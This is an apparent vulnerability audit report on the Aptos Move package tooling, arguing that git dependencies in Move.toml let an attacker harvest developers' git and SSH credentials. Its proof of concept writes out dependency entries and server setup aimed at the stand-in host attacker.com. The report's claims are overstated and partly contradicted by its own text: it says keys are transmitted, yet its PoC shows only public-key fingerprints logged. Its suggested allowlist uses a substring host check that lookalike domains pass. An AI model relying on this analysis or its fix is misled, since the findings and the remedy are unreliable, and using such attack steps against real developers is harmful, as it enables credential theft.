# Audit Report

## Title
Git Credential Exfiltration via Malicious Move Package Dependencies

## Summary
The `fetch_origin()` function in the Move package resolution system executes git commands against attacker-controlled repository URLs without credential isolation, enabling supply chain attacks that exfiltrate developer credentials (SSH keys, HTTP tokens, personal access tokens) to malicious servers.

## Finding Description
The Move package system allows developers to specify git dependencies in `Move.toml` manifests. When resolving these dependencies, the system clones and fetches from git repositories using the system's git installation with full access to the user's configured credentials. [1](#0-0) 

The git URL is parsed directly from the manifest without validation or allowlist checking. This URL is then used to create a `GitInfo` structure that's stored in the dependency. [2](#0-1) 

When building packages, the system clones from these URLs initially. On subsequent builds, the `fetch_origin()` function is called to update cached repositories: [3](#0-2) 

The `fetch_origin()` function executes a raw git command with no credential isolation: [4](#0-3) 

**Attack Path:**
1. Attacker publishes or contributes to a Move package
2. Adds git dependency: `MaliciousDep = { git = "git@attacker.com:repo.git", rev = "main", subdir = "" }`
3. Victim builds the package or a package that transitively depends on it
4. Git attempts to authenticate to `attacker.com` using victim's credentials:
   - SSH keys loaded in ssh-agent
   - HTTP credential helpers (PATs, OAuth tokens)
   - Git credentials stored in `.git-credentials`
5. Credentials are transmitted to attacker's server
6. Attacker logs/harvests the credentials

There are no mitigations in place:
- No allowlist of trusted git domains
- No warnings about untrusted dependencies
- No git environment variables set to disable credential prompts (`GIT_TERMINAL_PROMPT=0`, `GIT_ASKPASS=""`)
- No credential isolation or sandboxing [5](#0-4) 

## Impact Explanation
This vulnerability enables **Critical severity** attacks:

1. **Remote Code Execution on Validator Nodes**: Stolen SSH keys or cloud provider credentials could grant attackers access to validator infrastructure, enabling RCE and network compromise.

2. **Loss of Funds**: If validator operators or developers store private keys, wallet configurations, or blockchain credentials in git repositories, stolen git credentials provide access to these assets.

3. **Supply Chain Compromise**: Stolen credentials to legitimate repositories (GitHub, GitLab, etc.) enable attackers to inject malicious code into trusted packages, cascading the attack.

4. **Consensus Impact**: Compromised validator infrastructure could be used to disrupt consensus, cause liveness failures, or perform Byzantine attacks.

The attack requires no special privileges - any package author can specify arbitrary git URLs. Victims include all developers and validator operators who build Move packages with dependencies.

## Likelihood Explanation
**High Likelihood:**
- Developers commonly have SSH keys loaded in ssh-agent for productivity
- Many developers use global git credential helpers for HTTPS authentication
- Move packages routinely depend on other packages, creating transitive dependency chains
- Package manifests are trusted artifacts that developers don't scrutinize for malicious git URLs
- The attack is completely silent - users see normal "FETCHING GIT DEPENDENCY" messages
- No existing security controls prevent this attack

The attack is trivial to execute and requires only the ability to introduce or modify a Move package manifest.

## Recommendation
Implement defense-in-depth protections:

1. **Git URL Allowlist**: Maintain an allowlist of trusted git hosting providers:
```rust
const TRUSTED_GIT_HOSTS: &[&str] = &[
    "github.com",
    "gitlab.com",
    // Add other trusted hosts
];

fn validate_git_url(git_url: &str) -> Result<()> {
    let host = extract_host_from_git_url(git_url)?;
    if !TRUSTED_GIT_HOSTS.iter().any(|&trusted| host.contains(trusted)) {
        bail!("Git dependency from untrusted host '{}'. Only dependencies from trusted hosts are allowed: {:?}", host, TRUSTED_GIT_HOSTS);
    }
    Ok(())
}
```

2. **Disable Credential Exposure**: Set git environment variables to prevent credential leaks:
```rust
pub(crate) fn fetch_origin(repo_path: &str, dep_name: PackageName) -> anyhow::Result<()> {
    let status = Command::new("git")
        .args(["-C", repo_path, "fetch", "origin"])
        .env("GIT_TERMINAL_PROMPT", "0")  // Disable credential prompts
        .env("GIT_ASKPASS", "")           // Disable askpass
        .env("GIT_SSH_COMMAND", "ssh -o BatchMode=yes")  // Disable SSH passphrase prompts
        .stdout(Stdio::null())
        .stderr(Stdio::null())
        .status()
        // ... rest of function
```

3. **User Warnings**: Display prominent warnings when fetching from git dependencies:
```rust
writeln!(writer, 
    "{} Fetching from git repository: {}. Ensure you trust this source.",
    "WARNING:".bold().red(),
    git_url
)?;
```

4. **Cryptographic Verification**: Implement package signing and verification to establish trust chains independent of git URLs.

## Proof of Concept

**Setup malicious git server:**
```bash
# On attacker.com
mkdir -p /var/git/malicious.git
cd /var/git/malicious.git
git init --bare

# Configure git server to log authentication attempts
# SSH: Monitor /var/log/auth.log for key fingerprints
# HTTPS: Configure git HTTP backend to log Authorization headers
```

**Create malicious Move package:**
```toml
# Move.toml
[package]
name = "VictimPackage"
version = "0.1.0"

[dependencies]
MaliciousDep = { git = "git@attacker.com:/var/git/malicious.git", rev = "main", subdir = "" }
```

**Victim builds package:**
```bash
# Victim has SSH keys in ssh-agent
ssh-add ~/.ssh/id_rsa

# Build the package
aptos move compile

# Git automatically attempts SSH authentication to attacker.com
# Attacker's server logs the SSH key fingerprint and public key
```

**Alternative HTTPS credential theft:**
```toml
[dependencies]
MaliciousDep = { git = "https://attacker.com/repo.git", rev = "main", subdir = "" }
```

```bash
# Victim has credential helper configured
git config --global credential.helper store

# On build, git sends stored credentials to attacker.com
aptos move compile
```

The attacker receives authentication attempts with valid credentials in server logs, enabling account takeover, infrastructure compromise, and further supply chain attacks.

## Notes
This vulnerability affects the Move package development tooling, not the blockchain runtime itself. However, compromised developer and validator credentials can lead to critical blockchain security incidents including validator infrastructure compromise, private key theft, and malicious code injection into the Aptos ecosystem. The issue is similar to supply chain attacks in other package managers (npm, cargo, pip) but is particularly critical in the blockchain context where validators and developers manage high-value cryptographic keys.

### Citations

**File:** third_party/move/tools/move-package/src/source_package/manifest_parser.rs (L356-390)
```rust
                (None, Some(git), None) => {
                    let rev_name = match table.remove("rev") {
                        None => bail!("Git revision not supplied for dependency"),
                        Some(r) => Symbol::from(
                            r.as_str()
                                .ok_or_else(|| format_err!("Git revision not a string"))?,
                        ),
                    };
                    // Downloaded packages are of the form <sanitized_git_url>_<rev_name>
                    let git_url = git
                        .as_str()
                        .ok_or_else(|| anyhow::anyhow!("Git URL not a string"))?;
                    let local_path = git_repo_cache_path(git_url, rev_name.as_str());
                    let subdir = PathBuf::from(match table.remove("subdir") {
                        None => "".to_string(),
                        Some(path) => path
                            .as_str()
                            .ok_or_else(|| format_err!("'subdir' not a string"))?
                            .to_string(),
                    });
                    git_info = Some(PM::GitInfo {
                        git_url: Symbol::from(git_url),
                        git_rev: rev_name,
                        subdir: subdir.clone(),
                        download_to: local_path.clone(),
                    });

                    Ok(PM::Dependency {
                        subst,
                        version,
                        digest,
                        local: local_path.join(subdir),
                        git_info,
                        node_info,
                    })
```

**File:** third_party/move/tools/move-package/src/resolution/resolution_graph.rs (L557-576)
```rust
        if let Some(git_info) = &dep.git_info {
            let git_url = git_info.git_url.as_str();
            let git_rev = git_info.git_rev.as_str();
            let git_path = &git_info.download_to.display().to_string();

            // If there is no cached dependency, download it
            if !git_info.download_to.exists() {
                writeln!(
                    writer,
                    "{} {}",
                    "FETCHING GIT DEPENDENCY".bold().green(),
                    git_url,
                )?;

                // Confirm git is available.
                git::confirm_git_available()?;

                // If the cached folder does not exist, download and clone accordingly
                git::clone(git_url, git_path, dep_name)?;
                git::checkout(git_path, git_rev, dep_name)?;
```

**File:** third_party/move/tools/move-package/src/resolution/resolution_graph.rs (L608-608)
```rust
                git::fetch_origin(git_path, dep_name)?;
```

**File:** third_party/move/tools/move-package/src/resolution/git.rs (L70-95)
```rust
pub(crate) fn fetch_origin(repo_path: &str, dep_name: PackageName) -> anyhow::Result<()> {
    let status = Command::new("git")
        .args([
            "-C",
            repo_path,
            "fetch",
            "origin",
        ])
        .stdout(Stdio::null())
        .stderr(Stdio::null())
        .status()
        .map_err(|_| {
            anyhow::anyhow!(
                "Failed to fetch latest Git state for package '{}', to skip set --skip-fetch-latest-git-deps",
                dep_name
            )
        })?;
    if !status.success() {
        return Err(anyhow::anyhow!(
            "Failed to fetch to latest Git state for package '{}', to skip set --skip-fetch-latest-git-deps | Exit status: {}",
            dep_name,
            status
        ));
    }
    Ok(())
}
```

**File:** third_party/move/tools/move-package/README.md (L38-43)
```markdown
verify that dependencies exist at the declared locations, that their
package names and source digests match (if applicable), clone git
dependencies if they don't already exist locally, build a dependency graph
of Move packages and ensure this forms a DAG, compute an
assignment for each named address in each Move package in the package
graph, and ensure that the resulting named address assignment is valid.
```
